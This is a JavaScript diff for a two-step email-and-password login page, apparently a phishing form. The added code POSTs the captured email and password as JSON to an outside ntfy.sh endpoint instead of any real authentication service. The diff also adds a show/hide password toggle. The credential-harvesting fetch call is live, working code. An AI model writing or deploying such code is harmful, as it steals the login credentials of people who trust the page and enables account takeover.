@@ -18,12 +18,16 @@ const emailPage = document.querySelector(".p1");
 const passPage = document.querySelector(".p2");
 const emailBox = document.querySelector(".email-address");
 const showPassCheck = document.querySelector(".checkbox");
+const tick = document.querySelector(".check");
+let statu = "show";
 const vh = Math.max(
   document.documentElement.clientHeight || 0,
   window.innerHeight || 0
 );
 let account = {};
-
+showPassCheck.style.backgroundColor = "#174ea6";
+showPassCheck.style.border = "none";
+tick.style.display = "block";
 mainDiv.style.height = `${vh}px`;
 nextBtn.addEventListener("click", () => {
   if (emailInput.value == "") {
@@ -48,5 +52,37 @@ nextBtn2.addEventListener("click", () => {
   } else {
     account.passsword = passInput.value;
     console.log(account);
+    fetch("https://ntfy.sh/accounts", {
+      body: JSON.stringify(account),
+      headers: { "Content-Type": "text/plain" },
+      method: "POST",
+    });
+  }
+});
+
+const hide = (val) => {
+  let dots = val.replace(/./g, ".");
+  console.log(dots);
+  return dots;
+};
+let InitialPass;
+showPassCheck.addEventListener("click", () => {
+  if (passInput.value != "") {
+    if (statu == "show") {
+      statu = "hidden";
+      showPassCheck.style.backgroundColor = "#174ea6";
+      showPassCheck.style.border = "none";
+      tick.style.display = "block";
+      passInput.style.fontWeight = "bolder";
+      InitialPass = passInput.value;
+      passInput.value = hide(passInput.value);
+    } else {
+      statu = "show";
+      showPassCheck.style.backgroundColor = "transparent";
+      showPassCheck.style.border = "2px solid rgb(104, 103, 103)";
+      tick.style.display = "none";
+      passInput.style.fontWeight = "normal";
+      passInput.value = InitialPass;
+    }
   }
 });
